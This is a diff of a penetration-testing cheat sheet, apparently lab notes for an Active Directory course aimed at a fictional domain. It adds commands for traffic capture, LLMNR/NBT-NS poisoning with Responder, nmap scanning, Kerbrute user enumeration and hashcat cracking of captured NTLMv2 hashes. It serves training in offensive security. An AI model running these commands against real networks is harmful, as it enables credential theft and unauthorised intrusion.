@@ -565,11 +565,31 @@ swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --
 # Performs a ping sweep on the specified network segment from a Linux-based host
 fping -asgq 172.16.5.0/23
 
+# Captura Network Traffic
+sudo -E wireshark
+
+# Use tcpdump to captura traffic
+sudo tcpdump -i ens224
+
+# Responder is a purpose-built tool to poison LLMNR, NBT-NS, and MDNS, with many different functions.
+sudo responder -I ens224 -A -v
+#browse on the logs
+ls -l /usr/share/responder/logs
+
+#
+nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum-list.txt
+
 # Runs the Kerbrute tool to discover usernames in the domain (INLANEFREIGHT.LOCAL) specified proceeding the -d option and the associated domain controller specified proceeding --dcusing a wordlist and outputs (-o) the results to a specified file. Performed from a Linux-based host.
 ./kerbrute_linux_amd64 userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o kerb-results
+
+#Inveih.exe
+
+#Metasploit
 ```
 ##### LLMNR Poisoning
 ```
+sudo responder -I ens224 -A
+
 # Uses hashcat to crack NTLMv2 (-m) hashes that were captured by responder and saved in a file (frond_ntlmv2). The cracking is done based on a specified wordlist.
 hashcat -m 5600 forend_ntlmv2 /usr/share/wordlists/rockyou.txt
 ```
